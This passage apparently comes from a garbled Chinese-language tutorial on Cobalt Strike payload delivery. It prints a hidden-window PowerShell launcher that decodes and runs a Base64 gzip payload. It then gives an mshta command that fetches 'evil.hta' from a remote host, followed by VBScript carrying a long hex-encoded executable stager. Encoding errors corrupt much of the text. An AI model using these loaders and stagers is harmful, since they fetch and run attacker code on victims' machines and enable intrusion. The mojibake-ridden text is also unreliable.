MYOV5vr8af0eLF1Z8uIedu9og3t7uUn9/C+8Cb078ABtGBSyEKAAA=&apos;&apos;))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&apos;; $s.UseShellExecute=$false; $s.RedirectStandardOutput=$true; $s.WindowStyle=&apos;Hidden&apos;; $s.CreateNoWindow=$true; $p=[System.Diagnostics.Process]::Start($s); è§£å¯†å1if([IntPtr]::Size -eq 4)&#123;$b='powershell.exe'&#125;else&#123;$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'&#125;;$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c &amp;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIABhN0FwCA7VW+2/aSBD+OZH6P1gVkm2FYCC0aSJVujVPE5xAHAiEQ6fFXtsLa5vYa169/u83C3abXtO79qSzeOxjZnbmm29m7aahzWkUSr4xlz69OT3p4xgHklJwR1dFqRDdqCcnsFrYs2pd+igpU7RaNaIA03B2fV1P45iE/DgvtQlHSUKCOaMkUVTpT+nRJzE5v5sviM2lT1Lhj1KbRXPMMrFdHds+kc5R6Ii9XmRj4UrJWjHKFfn332V1el6ZlZrPKWaJIlu7hJOg5DAmq9JnVRz4sFsRRTapHUdJ5PLSIw0vqqVhmGCX3IK1NTEJ9yMnkVWIAj4x4WkcSod4hIHjtiLDsB9HNnKcmCSJXJSmwvR0NvtNmWbn3qchpwEpGSEncbSySLymNklKHRw6jNwTdwZaFo9p6M1UFcTW0ZIohTBlrCj9ihnllmxy1H5WSXmpBFJ9HqtFSOMrcZqRkzJy1JRfcVSkXoXnmH7A7fOb0zenbk6U+YX5kigwOpkexgRcU/pRQg9iH6VyUTLhEMyjeAfTwkOcEnX2BVipsF4Wf6xdyUVB0Kt0rS2sTUcRdWagkyWzsAnmYvnHnGwQl4aksQtxQO2cdsprABOXkUOApVzsFpxS5GyDOA3CiIe5gEzk+Tu1ZkD5F109pcwhMbIhSQl4BflTv3XmmAVFNkKTBIDQcQ7EK7hAdpJLZwTf5aeLOQjJdYaTpCj1U6g2uyhZBDPiFCUUJjTbQimPDkP5q7tmyji1ccJzczM1gzE7rh6FCY9TG3IGoT9YK2JTzAQSRalDHaLvLOrlx8qv4lDHjEEJgKU15AFWRPwWF0yIwUPIulqyCDeCFSMBSBxqvsWwBxWe0fxAHOwRR/6bezmLj5QVOOQAvHAOkmuxiBelEY05dA6B6YFB/+XwFy1DuFGPSZYEJS+Mqb7jgs+FjXUlyJghcog/5hB7K44CHSfkfe3YHJS32h2tI3gmRshMW1/SCtrQimHCd0gvjKhx6dx0Fx0tbmx9FxmJYXb6jUGnU1t3rVGNW02D3/QNbjbHi4WFOvfDCX8yUOeBlpeT2n7VpXurh5zJVnu/1/ebsr7dLzzHnTRc17t0rfvKuxbtPdYHermKe41m2nvUN3q5ljTppjOgw8Gy2+LzyYjhoat548oVpttevBhVInNvINT2L+x91x21fdPZTTqULLRyjw7QAKEb+344bHsrr50g7Wr0XA8W6NkkdxgZqDnadd8xfTBs6WjY1Af4LupfnDW0ypPz3Gw9jXE3YE67o1UmY+SgWHvw/MrlnR8KnLCnP+tCBvWedi0NZPo11KlV6f7pedD2UBNkRkGEcIsuh2djsHn7ADqPw4oTIR4aY00beZqHXMufYKSDtP6MWnpU333om31tNKr6lfmy4oPPZLz+YHbRWcvua5p2FszhV0O2udqGY31zud5w3H0E2w/a1fDjW8EQoEhhVa0+vcj9j7q1iePExww4AW04L8FWFLey3tqPqNBQFHEZL0kcEga3Gdx3OZURY5Et+rpownClHBu9uHeGMLyovjpSpS+C6td2ny9dXz+Bj1AaQN9Sj4Qe94vl7UW5DO27vK2VIcSfD6serXaKsFQU3f8AS2aZHSyromAK6fJ/xSqrUR/+nH/B6uvaP+z+FH7l4jHa75a/XfglNH818EdMOQha0GMYOV5vr8af0eLF1Z8uIedu9og3t7uUn9/C+8Cb078ABtGBSyEKAAA=''))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s); Gzipæ–‡ä»¶æµBase64åŠ å¯† Defenderæ‹¦æˆª 0x03 Cobalt StrikeAttacks â€“&gt; Packages â€“&gt; HTML Application ç”Ÿæˆçš„.HTAæ–‡ä»¶å­˜åœ¨æœ¬åœ°ï¼Œå¯ä»¥é€šè¿‡å¤šç§æ–¹å¼ä¼ å…¥å—å®³æœºå—å®³æœºä¸Šæ‰§è¡Œå‘½ä»¤1mshta http://192.168.199.142:8080/evil.hta evil.hta1234567891011121314151617181920212223242526272829&lt;script language=&quot;VBScript&quot;&gt; Function var_func() var_shellcode = &quot;04d5a9000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c010700e26f3a570000000000000000e0000f030b010216001c00000034000000060000b0140000001000000030000000004000001000000002000004000000010000000400000000000000009000000004000024dc0000020000000000200000100000000010000010000000000000100000000000000000000000006000003006000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000018000000000000000000000000000000000000001c610000e00000000000000000000000000000000000000000000000000000002e74657874000000c41a000000100000001c000000040000000000000000000000000000600050602e6461746100000024060000003000000008000000200000000000000000000000000000400060c02e72646174610000d0020000004000000004000000280000000000000000000000000000400030402e627373000000001c040000005000000000000000000000000000000000000000000000800060c02e69646174610000300600000060000000080000002c0000000000000000000000000000400030c02e4352540000000034000000007000000002000000340000000000000000000000000000400030c02e746c730000000020000000008000000002000000360000000000000000000000000000400030c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f3c38db426000000008dbc270000000083ec2ca120504000c744241018504000c74424080c504000c744240408504000a318504000a124504000c70424045040008944240ce896190000a31c50400083c42cc38db6000000008dbc270000000083ec1c31c066813d000040004d5ac7053050400001000000c7052c50400001000000c7052850400001000000c7053c504000010000007468a314504000a14050400085c0744ac7042402000000e836190000c70424ffffffffe8020800008b1544504000a3fc534000a300544000a1ac6140008910e8260b0000833d1436400001746d31c083c41cc38db42600000000c7042401000000e8ec180000ebb466908b153c00400081ba00004000504500008d8a0000400075800fb751186681fa0b01743f6681fa0b020f856affffff83b9840000000e0f865dffffff8b91f800000031c085d20f95c0e94bffffff8d7600c70424a01b4000e8340a000031c083c41cc38379740e0f862cffffff8b89e800000031c085c90f95c0e91affffff66905531c089e5b91100000057568d55a45389d783ec7cf3abb030e8d217000029c48d44241b83e0f0c700ccccccccc74004ccccccccc74008ccccccccc7400cccccccccc74010ccccccccc74014ccccccccc74018ccccccccc7401ccccccccc83e4f0a14050400085c00f858502000064a1180000008b35686140008b5804eb159039d80f8418020000c70424e8030000ffd683ec04c744240800000000895c2404c7042404544000e89417000083ec0c85c075cda10854400031db83f8010f84f0010000a10854400085c00f8434020000c7050050400001000000a10854400083f8010f84e801000085db7507f0871d04544000a18040400085c0741cc744240800000000c744240402000000c7042400000000ffd083ec0ce8130c0000c70424b0194000ff156461400083ec04a348504000e8a9110000c744240400404000890424ff154061400083ec0885c07409c7042400104000ffd0e843120000a14050400085c0745ea1a061400031c98b00eb0b84d2742b84c9741c83c0010fb61080fa207eed89cb83f30180fa220f44cbebe884d2740b83c0010fb61080fa207ef10fb755d4f645d001a3e4534000b80a000000c705ec534000000040000f45c2a3e85340008b150450400031db8d049504000000895594890424e89a1600008b3d085040008945908b459485c07e3c66908b049f890424e8851600008d7001893424e8721600008b559089049a8b149f83c3018974240889042489542404e84e1600003b5d9475c9c1e3028b4590c7041800000000a308504000e8f2110000a1906140008b150c5040008910a10c50400089442408a10850400089442404a104504000890424e89a0200008b351450400085f6a3105040000f84aa0000008b1d0050400085db750ae8fc150000a1105040008d65f45b5e5f5dc38db42600000000a108544000bb0100000083f8010f8510feffffc704241f000000e8d1150000a10854400083f8010f851bfeffff8d7600c744240408704000c7042400704000e8b4150000c7050854400002000000e9f5fdffff891424ff154461400083ec04e96afdffffc7050854400001000000c744240418704000c704240c704000e876150000e9b3fdffff890424e8711500009083ec0cc7054050400001000000e80e11000083c40ce9b6fcffff8db60000000083ec0cc7054050400000000000e8ee10000083c40ce996fcffff9090909090905589e583ec18a12036400085c0743cc7042420404000ff153c614000ba0000000083ec0485c07416c74424042e404000890424ff154061400083ec0889c285d27409c7042420364000ffd2c9c38d76005589e55dc390909090909090909090905589e55383ec348b450cc744240c40000000c74424080010000089442404c7042400000000a178614000ffd083ec108945f0c745f400000000eb448b45f489c1034d088b45f40345080fb6188b45f489c2c1fa1fc1ea1e01d083e00329d00345100fb60031d888018b45f489c20355088b45f40345f00fb61288108345f4018b45f43b450c7cb48b45f0c744241400000000c744241000000000c744240c0000000089442408c744240400000000c7042400000000a11c614000ffd083ec188b5dfcc9c35589e583ec28c745f4003040008b45f48b4004890424e8c91300008945f08b45f48b400489c18b45f483c01089c28b45f0894c240889542404890424e89b1300008b45f48d50088b45f48b400489542408894424048b45f0890424e8dcfeffff8b45f0890424e8a9130000c9c39090908d4c240483e4f0ff71fc5589e55183ec14e8160f0000c7042400000000e86effffffc7042410270000a168614000ffd083ec04ebed9090900000000083ec1c8b44242485c0741583f8037410b80100000083c41cc20c00908d7426008b542428894424048b44242089542408890424e8d8110000b80100000083c41cc20c008db6000000008dbc27000000005383ec188b15c46140008b442424833a037631833d1036400002740ac705103640000200000083f8020f840401000083f8010f849a00000083c418b8010000005bc20c00c705f853400001000000c7042444404000ff155861400083ec0485c0a3385040000f84f80000008b1d40614000c744240451404000890424ffd3a3f4534000a13850400083ec08c74424046c404000890424ffd38b153850400083ec0885d2a3f05340000f84b50000008b0df453400085c9743b85c07437c705103640000100000083c418b8010000005bc20c008b442428c744240401000000894424088b442420890424e8d2100000e945ffffffc705f053400000000000c705f453400000000000891424ff152861400083ec04c7053850400000000000b801000000c705103640000000000083c4185bc20c00bb3070400081fb307040000f84f4feffff8b0385c07402ffd083c30481fb3070400075ed83c418b8010000005bc20c00c705f053400000000000c705f453400000000000eb9a8db4260000000031c0c390909090909090909090909090a194614000ffe09090909090909090908b442404c38d7426008dbc27000000008b442404c390909090909090909090905383ec28a1005440008b5c2430890424e8cbffffff83f8ff894424180f847e000000c7042408000000e832110000a100544000890424e8a5ffffff89442418a1fc534000890424e894ffffff891c248944241c8d44241c894424088d44241889442404e80011000089c38b442418890424e87affffffa3005440008b44241c890424e869ffffffc7042408000000a3fc534000e8d810000083c42889d85bc390891c24ff15bc61400083c42889c389d85bc38db426000000008dbc270000000083ec1c8b442420890424e831ffffff83f80119c083c41cc39090909090909090565383ec248b5c24308b038b003d910000c077433d8d0000c07269be01000000c744240400000000c7042408000000e86410000083f8010f841301000085c0742bc7042408000000ffd0b8ffffffff83c4245b5ec204003d940000c074673d960000c0742d3d930000c074afa14850400085c00f84ca000000895c243083c4245b5effe03d050000c074453d1d0000c075dac744240400000000c7042404000000e8f20f000083f801745c85c074bdc7042404000000ffd083c424b8ffffffff5b5ec2040031f6e954ffffff8d742600c744240400000000c704240b000000e8b40f000083f801743c85c00f847bffffffc704240b000000ffd083c424b8ffffffff5b5ec20400c744240401000000c7042404000000e87d0f0000b8ffffffffe92affffffc744240401000000c704240b000000e85f0f0000b8ffffffffe90cffffff31c0e905ffffff8db600000000c744240401000000c7042408000000e8340f000085f6b8ffffffff0f84defeffff8944241ce8f60900008b44241ce9ccfeffff9090909090909090909090909083ec3ca14c504000dd442448dd442450dd44245885c07429d9ca8b542440dd5c2418dd5c2420dd5c2428895424108b542444895424148d542410891424ffd0eb06ddd8ddd8ddd883c43cc3908d7426008b442404a34c504000e9b20e0000669083ec3cba844040008b4424408b0883e90183f90577078b148da0414000dd4018dd5c2420dd4010dd5c2418dd4008dd5c24108b400489542408c7442404944040008944240ca1b461400083c040890424e8630e000031c083c43cc3909090909031c0c3909090909090909090909090905383ec18a1b4614000c74424081b0000008d5c2424c744240401000000c70424b841400083c0408944240ce8200e00008b442420895c240889442404a1b461400083c040890424e80c0e0000e80f0e0000eb0d909090909090909090909090905589cd57565389c383ec6c8b0d585040008954241c85c90f8ec5010000a15450400031f68b500439d3720e8b780803570839d30f82d700000083c60183c00c39ce75e1891c24e8b505000085c089c70f84b40100008d14768b3554504000c1e20201d6894608c7060000000089542418e86b0600008b54241803470c8946048d4424408b358061400089442404a154504000c74424081c0000008b441004890424ffd683ec0c85c08b5424180f84370100008b44245483f8040f85d2000000830558504000018d442424c74424081c00000089442404891c24ffd683ec0c85c00f84330100008b44243883f80475298b44241c896c2408891c2489442404e87d0c000083c46c5b5e5f5dc3908d7426008b3580614000ebae83f84074d28b4424308d7c245c8b357c614000897c240cc744240840000000894424048b442424890424ffd683ec108b44241c896c2408891c2489442404e8250c00008b44243883f840749f83f804749a8b44245c897c240c894424088b442430894424048b442424890424ffd683ec1083c46c5b5e5f5dc383f8400f8425ffffff8b44244c031554504000c744240840000000894424048b4424408954240c890424ff157c61400083ec1085c00f85f3feffffff1538614000c704242842400089442404e8befdffff31f6e95afeffffa1545040008b441004894424088b4708c70424f441400089442404e897fdffff895c2404c70424d4414000e887fdffff895c2408c74424041c000000c70424f4414000e86ffdffffeb0d909090909090909090909090905589e557565383ec4ca15050400085c0740e8d65f45b5e5f5dc38db600000000c7055050400001000000e8d10300008d04408d04851e00000083e0f0e87f0a0000c705585040000000000029c48d44241f83e0f0a354504000b8d04240002dd042400083f8077eaa83f80bbbd04240000f8eea000000a1d042400085c07511a1d442400085c00f84c00000008d74260081fbd04240000f8376ffffffbe000040008b4304b90400000001f08b10031383c3088955e48d55e4e803fdffff81fbd042400072dc8b0d5850400085c90f8e3fffffff31db31f68b3d80614000eb139083c60183c30c3b35585040000f8d20ffffffa15450400001d88b1085d274e18d55c4c74424081c000000895424048b4004890424ffd783ec0c85c00f84510100008d45e48944240ca1545040008b0418894424088b45d0894424048b45c4890424ff157c61400083ec10eb94a1d842400085c07520bbdc4240008db6000000008b3b85ff0f8526ffffff8b730485f60f851bffffff8b430883f8010f851401000083c30c81fbd04240000f8382feffff0fb65308b8000040008b0b03430483fa108bb100004000744183fa20747283fa08741789542404c7042484424000c745e000000000e896fbffff0fb638f7c780000000742081cf00ffffff29cf81ef0000400001fe8975e0eb270fb738f7c700800000755b29cf81ef0000400001fe83fa108975e0745c83fa20742383fa08752bb9010000008d55e0e8a2fbffffeb1c8b1029ca81ea0000400001f28955e0b9040000008d55e0e884fbffff83c30c81fbd04240000f8245ffffffe975feffff81cf0000ffff29cf81ef0000400001fe8975e0b9020000008d55e0e850fbffffebca031d545040008b4304894424088b43088b4008c70424f441400089442404e8cbfaffff89442404c7042450424000e8bbfaffff90909090909090909090908b54240431c066813a4d5a7403f3c39003523c813a5045000075f231c066817a180b010f94c0c389f68dbc27000000005631c0538b54240c8b5c241003523c0fb772060fb74a1485f674230fb7c98d440a1831d28b480c39d9770703480839cb720c83c20183c02839f272e831c05b5ec3eb0d909090909090909090909090905557565331db83ec1c8b7c2430893c24e80b08000083f8087759c7042400004000e85affffff85c07449a13c0040000fb7a8060040000fb79014004000050000400085ed742d0fb7d231f68d5c1018eb0a83c60183c32839ee7325c744240808000000897c2404891c24e82908000085c075de83c41c89d85b5e5f5dc38d760083c41c31db89d85b5e5f5dc38d74260083ec08c7042400004000e8e1feffff89c231c085d274198b44240cc70424000040002d0000400089442404e8f0feffff83c408c38db6000000008dbf0000000083ec04c7042400004000e8a1feffff31d285c0740ca13c0040000fb7900600400089d083c404c389f68dbc2700000000565383ec04c70424000040008b5c2410e86bfeffff31d285c0743ea13c0040000fb788060040000fb7b014004000050000400085c974220fb7f68d54301831c0f6422720740785db740f83eb0183c00183c22839c872e931d283c40489d05b5ec3eb0d9090909090909090909090909083ec04c7042400004000e801feffff31d285c0b8000040000f45d083c40489d0c3eb0d909090909090909090909090905331db83ec08c7042400004000e8cefdffff85c0750a83c40889d85bc38d76008b442410c70424000040002d0000400089442404e8d7fdffff85c074d98b582483c408f7d3c1eb1f89d85bc38d7426005731ff565383ec08c70424000040008b5c2418e878fdffff85c07455a13c0040008bb08000400085f6744689742404c7042400004000e885fdffff85c0743281c600004000750feb288db4260000000083eb0183c6148b560485d275078b460c85c0741c85db7fe88b7e0c81c70000400083c40889f85b5e5fc38db60000000083c40831ff89f85b5e5fc3908d7426005383ec18a15c50400085c0740583c4185bc331c08904248d5801e851ffffff85c0747d0fb61080fa4d740580fa6d75500fb6500180fa53740580fa7375420fb6500280fa56740580fa7675340fb6500380fa43740580fa6375260fb6500480fa52740580fa7275180fb6500580fa54741380fa74740e83ea3080fa097606669089d8eb90890424ff153c61400083ec0485c0a35c5040000f8570ffffff8d7600c70424b0424000ff155c61400083ec04a35c504000e953ffffff909090909090dbe3c39090909090909090909090909083ec0ca10c3640008b0085c074196690ffd0a10c3640008d50048b400489150c36400085c075e983c40cc3908d7426005383ec188b1db02a400083fbff742485db740fff149db02a400083eb018d760075f1c7042430254000e802f4ffff83c4185bc331dbeb0289c38d43018b1485b02a400085d275f0ebc68db426000000008b0d6050400085c97406f3c38d742600c7056050400001000000eb949090909083ec4ca118364000895c243c89742440897c24443d4ee640bb896c2448c744242000000000c7442424000000007421f7d0a31c3640008b5c243c8b7424408b7c24448b6c244883c44cc38db6000000008d442420890424ff154861400083ec048b4424248b6c24208944241cff153061400089c7ff153461400089c6ff154c61400089c38d442428890424ff156061400083ec04336c241c336c2428336c242c31fd31f531dd89e881fd4ee640bbf7d07410892d18364000a31c364000e974ffffffb8b019bf44bd4fe640bbebe466905589e583ec288b45048d5504891544514000c70560534000090400c0c7056453400001000000a338514000a36c5340008b4508c7042400000000a32c514000a1183640008945f0a11c3640008945f4ff156461400083ec04c70424c8424000ff157461400083ec04ff152c614000c7442404090400c0890424ff156c61400083ec08e8490300009090909090909090905557565383ec1cc70424c4534000ff15246140008b1ddc53400083ec0485db74348b2d706140008b3d386140008d76008b03890424ffd583ec0489c6ffd785c0750c85f674088b4304893424ffd08b5b0885db75dbc70424c4534000ff155461400083ec0483c41c5b5e5f5dc38d760083ec1ca1c0534000895c241431db8974241885c0750e89d88b7424188b5c241483c41cc3c74424040c000000c7042401000000e8a802000085c089c674498b442420c70424c453400089068b442424894604ff1524614000a1dc5340008935dc53400089460883ec04c70424c4534000ff155461400089d883ec048b5c24148b74241883c41cc3bbffffffffeb8866905383ec18a1c05340008b5c242085c0750783c41831c05bc3c70424c4534000ff15246140008b15dc53400083ec0485d2741d8b0239d87510eb4c8db6000000008b0839d9742089c28b420885c075f1c70424c4534000ff155461400083ec0483c41831c05bc38b4808894a08890424e884010000c70424c4534000ff155461400083ec04ebd98b4208a3dc53400089d0ebda8db426000000008dbc270000000083ec1c8b44242483f8017444721283f803745db80100000083c41cc38d742600a1c053400085c07569a1c053400083f80175e0c705c053400000000000c70424c4534000ff152061400083ec04ebc490a1c053400085c07427c705c053400001000000b80100000083c41cc38d742600a1c053400085c0749ae8e2fdffffeb93c70424c4534000ff155061400083ec04ebc7e8c9fdffffeb909090909090909051503d001000008d4c240c721581e9001000008309002d001000003d0010000077eb29c18309005859c39090000000008b44240c8b5424088b4c2404f00fb111c3eb0d909090909090909090909090908b44240c8b5424088b4c2404f00fb111c20c0090909090909090909090909090ff258c6140009090ff25986140009090ff25e46140009090ff25e06140009090ff25ec6140009090ff25a86140009090ff25a46140009090ff25b06140009090ff25d06140009090ff25d86140009090ff25b86140009090ff25886140009090ff25c06140009090ff25e86140009090ff259c6140009090ff25d46140009090ff25dc6140009090ff25f46140009090ff25c86140009090ff25f06140009090ff25cc614000909000000000000000005589e583ec18e855eaffffc7042440154000e8e9eeffffc9c390909090909090ffffffff902a400000000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010200000110200005694e0fa61616161aa7c69fa56948073b3a5329eddc6d07104986ba8421f92d25923aadc676bd13afaa8818654b8c03b9999e13db464b2adddc6f07114a8e12addd4987f96e0aafb86c46bb24e1fb8da574703c61f1fd4715742d10567544c3b9999e13d6e74950e55e918c12bb095180e1fb8de574786715adf6ba24a953371521fe12adfd0c4de0dcf81a30cc51f1a0ecbba71447f66a73efa858e56fc979338fdb4921ae3c6fda941087a5694e0b739ee89963af5cfcf78a4c0d235fb8d8a37e089983af1dbda1bc7a9bf76adceca6db4b79338f08f8d25b4aeae76a2cecb6db4b79338a2d4c176ecd6ce6db4b4883ff0859422bbd5d466afc0b819dda5c36dd1aeaf05bde0a20eccb8a20eccb8a20eccb8a20eccb8a20eccb8a20eccb8a20eccb8a20eccb8a20eccb8a20ecce0a3676bb7ad01c3b1926cc2995da9410b830da529ab07fee3ab07fcb0fa5694b3aa3ec36965906b351134cdd12804fce0f83610b2a804c5b2aa3e7fb5d46d6b357390a51fad01c3b7ac3eb9e6e22d6b357f96e0a4cba911168e521d19115ffc4a3fb4c91f2fdf5588bf77cad10583a51fad3c93b1ac06fc57adb69f1f2fe994cffa56ad278eeaa51f11437fa912cf6b1f0579f8b6b71b94e092a62142aca9418aba3e94f0fa56fce0fa1694b7920e30b31fa94173a9051d07ad3e94c0fa56c7b69244026918a941653a22596bfd5757653a2371b839bea31f05a9a5d9c878a5d6c278a5d9c378a5d4c85658354f2150254041505b345c505a58353428505e2937434329377d2445494341522d5354414e444152442d414e544956495255532d544553542d46494c452124482b482a4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141410000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ff000000ffffffffffffffffc02a400002000000ffffffff4ee640bbb119bf440000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005f7365745f696e76616c69645f706172616d657465725f68616e646c657200006c696267636a2d31322e646c6c005f4a765f5265676973746572436c61737365730000006d696e67776d31302e646c6c005f5f6d696e67777468725f72656d6f76655f6b65795f64746f72005f5f6d696e67777468725f6b65795f64746f720010174000556e6b6e6f776e206572726f720000005f6d61746865727228293a20257320696e2025732825672c2025672920202872657476616c3d2567290a0000417267756d656e7420646f6d61696e206572726f722028444f4d41494e2900417267756d656e742073696e67756c617269747920285349474e2900004f766572666c6f772072616e6765206572726f7220284f564552464c4f57290054686520726573756c7420697320746f6f20736d616c6c20746f20626520726570726573656e7465642028554e444552464c4f5729000000546f74616c206c6f7373206f66207369676e69666963616e63652028544c4f53532900005061727469616c206c6f7373206f66207369676e69666963616e63652028504c4f53532900000000c0404000df404000fc4040001c41400054414000784140004d696e67772d7736342072756e74696d65206661696c7572653a0a004164647265737320257020686173206e6f20696d6167652d73656374696f6e0020205669727475616c5175657279206661696c656420666f7220256420627974657320617420616464726573732025700000000020205669727475616c50726f74656374206661696c6564207769746820636f6465203078257800002020556e6b6e6f776e2070736575646f2072656c6f636174696f6e2070726f746f636f6c2076657273696f6e2025642e0a0000002020556e6b6e6f776e2070736575646f2072656c6f636174696f6e206269742073697a652025642e0a0000006d00730076006300720074002e0064006c006c00000000006053400080504000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003c6000000000000000000000a46500001c610000a8600000000000000000000024660000886100000000000000000000000000000000000000000000fc6100000c620000246200003c6200004a6200005e620000746200008a6200009a620000ae620000c0620000d2620000ec620000fc620000186300003063000040630000506300006a6300008863000090630000a4630000b2630000ce630000de630000f063000000000000006400000e6400001e6400002a6400003a6400004c640000606400006a64000078640000826400008c64000098640000a0640000a8640000b2640000bc640000c8640000d0640000da640000e2640000ec640000f4640000fe64000008650000126500001c650000266500003065000000000000fc6100000c620000246200003c6200004a6200005e620000746200008a6200009a620000ae620000c0620000d2620000ec620000fc620000186300003063000040630000506300006a6300008863000090630000a4630000b2630000ce630000de630000f063000000000000006400000e6400001e6400002a6400003a6400004c640000606400006a64000078640000826400008c64000098640000a0640000a8640000b2640000bc640000c8640000d0640000da640000e2640000ec640000f4640000fe64000008650000126500001c650000266500003065000000000000a7004372656174655468726561640000c40044656c657465437269746963616c53656374696f6e00df00456e746572437269746963616c53656374696f6e00005301467265654c69627261727900b10147657443757272656e7450726f6365737300b20147657443757272656e7450726f63657373496400b50147657443757272656e7454687265616449640000ee014765744c6173744572726f720000fe014765744d6f64756c6548616e646c65410000290247657450726f63416464726573730000440247657453746172747570496e666f41005b0247657453797374656d54696d65417346696c6554696d650073024765745469636b436f756e740000c602496e697469616c697a65437269746963616c53656374696f6e0001034c65617665437269746963616c53656374696f6e000003034c6f61644c69627261727941000006034c6f61644c69627261727957000067035175657279506572666f726d616e6365436f756e746572003104536574556e68616e646c6564457863657074696f6e46696c746572003d04536c6565700049045465726d696e61746550726f6365737300005004546c7347657456616c7565005d04556e68616e646c6564457863657074696f6e46696c746572000074045669727475616c416c6c6f6300007d045669727475616c50726f74656374000080045669727475616c5175657279000038005f5f646c6c6f6e65786974003b005f5f6765746d61696e61726773003c005f5f696e6974656e760045005f5f6c636f6e765f696e6974000069005f5f7365745f6170705f7479706500006c005f5f736574757365726d61746865727200007a005f61636d646c6e008f005f616d73675f657869740000a0005f63657869740000fc005f666d6f646500003d015f696e69747465726d0041015f696f620000a5015f6c6f636b0047025f6f6e6578697400f5025f756e6c6f636b007b035f77696e6d616a6f7200bd0361626f727400cb0363616c6c6f630000d503657869740000e503667072696e746600ec03667265650000f703667772697465000024046d616c6c6f6300002c046d656d637079000049047369676e616c00005d047374726c656e000060047374726e636d7000800476667072696e7466000000600000006000000060000000600000006000000060000000600000006000000060000000600000006000000060000000600000006000000060000000600000006000000060000000600000006000000060000000600000006000000060000000600000006000004b45524e454c33322e646c6c00000000146000001460000014600000146000001460000014600000146000001460000014600000146000001460000014600000146000001460000014600000146000001460000014600000146000001460000014600000146000001460000014600000146000001460000014600000146000006d73766372742e646c6c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010104000000000000000000060104000a0184000000000000000000010174000c016400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000